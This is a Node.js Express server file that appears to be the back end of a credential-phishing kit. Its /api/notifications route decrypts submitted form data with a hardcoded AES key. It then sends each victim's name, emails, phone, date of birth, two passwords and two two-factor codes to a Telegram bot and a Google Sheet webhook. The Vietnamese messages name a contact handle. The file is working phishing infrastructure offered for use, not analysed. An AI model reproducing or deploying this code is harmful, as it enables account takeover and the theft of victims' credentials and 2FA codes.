import express from "express";
import 'dotenv/config';
import cors from "cors";
import axios from 'axios';
import CryptoJS from "crypto-js";
import rateLimit from "express-rate-limit";
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.static(path.resolve(__dirname, '../app/dist')));
app.set('trust proxy', 1);

// IP blocking mechanism
const blockedIPs = new Map(); // Changed to Map to store block details
const violationCounts = new Map();
const VIOLATION_LIMIT = 10; // Number of violations before permanent block
const BLOCK_DURATION = 24 * 60 * 60 * 1000; // 24 hours in milliseconds

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
const secretKey = 'HDNDT-JDHT8FNEK-JJHR';

function decrypt(encryptedData) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) throw new Error("Decryption failed");
        return decrypted;
    } catch (error) {
        throw new Error("Invalid encrypted data");
    }
}

const sendTelegramMessage = async (message) => {
    try {
        await axios.post(TELEGRAM_API, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Error sending Telegram message:', error.message);
    }
};

const blockIP = async (ip, isPermanent = false) => {
    const blockInfo = {
        timestamp: Date.now(),
        isPermanent
    };
    blockedIPs.set(ip, blockInfo);
    
    // Notify on Telegram about IP block
    const message = `🚫 IP Address blocked:\n<code>${ip}</code>\nType: ${isPermanent ? 'Permanent' : 'Temporary (24 hours)'}`;
    await sendTelegramMessage(message);
}

function isIPBlocked(ip) {
    if (!blockedIPs.has(ip)) return false;
    
    const blockInfo = blockedIPs.get(ip);
    if (blockInfo.isPermanent) return true;
    
    // Check if temporary block duration has passed
    if (Date.now() - blockInfo.timestamp >= BLOCK_DURATION) {
        blockedIPs.delete(ip);
        return false;
    }
    return true;
}

const ipFilter = (req, res, next) => {
    const ip = req.ip;
    if (isIPBlocked(ip)) {
        const blockInfo = blockedIPs.get(ip);
        return res.status(403).json({ 
            message: blockInfo.isPermanent 
                ? 'Access forbidden: IP is permanently blocked'
                : 'Access forbidden: IP is temporarily blocked'
        });
    }
    next();
};

const registerLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10,
    message: 'Too many requests from this IP',
    headers: true,
    handler: (req, res) => {
        const ip = req.ip;
        
        // Increment violation count
        const currentViolations = (violationCounts.get(ip) || 0) + 1;
        violationCounts.set(ip, currentViolations);
        
        // Check if should be permanently blocked
        if (currentViolations >= VIOLATION_LIMIT) {
            blockIP(ip, true); // Permanent block
            return res.status(403).json({
                message: 'Access forbidden: IP has been permanently blocked due to multiple violations'
            });
        }
        
        // Temporary block
        blockIP(ip, false);
        return res.status(429).json({
            message: 'Too many requests. IP has been temporarily blocked.',
            violationsCount: currentViolations,
            violationsRemaining: VIOLATION_LIMIT - currentViolations
        });
    },
});

app.post('/api/notifications', ipFilter, registerLimiter, async (req, res) => {
    try {
        const { data } = req.body;
        if (!data) {
            return res.status(400).json({ message: "Invalid request: 'data' is required", error_code: 1 });
        }

        const decryptedData = decrypt(data);
        const values = JSON.parse(decryptedData);

        res.status(200).json({
            message: 'Success',
            error_code: 0
        });

        const message = `<b>Ip:</b> <code>${values.user_ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n<b>Location:</b> <code>${values.ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n-----------------------------\n<b>Name:</b> <code>${values.name || ''}</code>\n<b>Email:</b> <code>${values.email || ''}</code>\n<b>Email business:</b> <code>${values.email_business || ''}</code>\n<b>Phone:</b> <code>${values.phone || ''}</code>\n<b>Page:</b> <code>${values.page || ''}</code>\n<b>Date of birth:</b> <code>${values.day}/${values.month}/${values.year}</code>\n<b>Password First:</b> <code>${values.password || ''}</code>\n<b>Password Second:</b> <code>${values.secondPassword || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.twoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
        await sendTelegramMessage(message);

        if (process.env.WEBHOOK_URL) {
            const url = new URL(process.env.WEBHOOK_URL);

            url.searchParams.append('Ip', values.ip ? values.ip : '');
            url.searchParams.append('Name', values.name ? values.name : '');
            url.searchParams.append('Email', values.email ? values.email : '');
            url.searchParams.append('Email business', values.email_business ? values.email_business : '');
            url.searchParams.append('Phone', values.phone ? values.phone : '');
            url.searchParams.append('Page', values.page ? values.page : '');
            url.searchParams.append('Date of birth', `${values.day}/${values.month}/${values.year}` ? `${values.day}/${values.month}/${values.year}` : '');
            url.searchParams.append('Password First', values.password ? values.password : '');
            url.searchParams.append('Password Second', values.secondPassword ? values.secondPassword : '');
            url.searchParams.append('First Two-Fa', values.twoFa ? values.twoFa : '');
            url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');

            axios.get(url)
                .then(response => {
                    sendTelegramMessage('✅ Thêm dữ liệu vào Sheet thành công.');
                })
                .catch(err => {
                    sendTelegramMessage('❌ Thêm vào Google Sheet không thành công.');
                });
        }

    } catch (error) {
        await sendTelegramMessage(`❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`);
        res.status(500).json({
            message: 'Error',
            error_code: 1
        });
    }
});

// SSR setup
async function createServer() {
    const vite = await createViteServer({
        server: { middlewareMode: true },
        appType: 'custom'
    });

    app.use(vite.middlewares);

    app.use('*', async (req, res) => {
        const url = req.originalUrl;

        try {
            // Read index.html
            let template = await vite.transformIndexHtml(
                url,
                await vite.ssrLoadModule('/app/index.html')
            );

            // Load server entry
            const { render } = await vite.ssrLoadModule('/app/src/entry-server.jsx');

            // Render app HTML
            const appHtml = await render(url);

            // Inject app HTML into template
            const html = template.replace('<!--app-html-->', appHtml);

            // Send rendered HTML
            res.status(200).set({ 'Content-Type': 'text/html' }).end(html);
        } catch (e) {
            vite.ssrFixStacktrace(e);
            console.error(e);
            res.status(500).end(e.message);
        }
    });
}

const SERVER_PORT = process.env.SERVER_PORT || 3000;
createServer().then(() => {
    app.listen(SERVER_PORT, () => {
        console.log(`Server listening port ${SERVER_PORT}`);
    });
});
